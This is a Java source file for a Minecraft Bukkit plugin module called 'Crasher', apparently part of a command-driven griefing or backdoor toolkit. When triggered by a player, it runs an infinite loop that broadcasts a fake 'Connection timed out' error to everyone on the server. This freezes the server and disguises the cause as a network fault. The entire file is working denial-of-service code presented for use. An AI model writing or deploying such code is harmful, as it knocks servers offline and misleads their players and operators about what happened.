package me.sanyar.modules;

import me.sanyar.main.Main;
import me.sanyar.utils.VModule;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class Crasher extends VModule {


    public Crasher() {
        super("crasher", "Crash the Server");
    }

    @Override
    public void onModule(String[] args, Player player) {
        if(args.length == 1){
            while(1==1){
                Bukkit.broadcastMessage("§f[@] java.net.ConnectException: Connection timed out: no further information");
            }
        }else{
            player.sendMessage(Main.getInstance().getErrsyn());
        }

    }
}
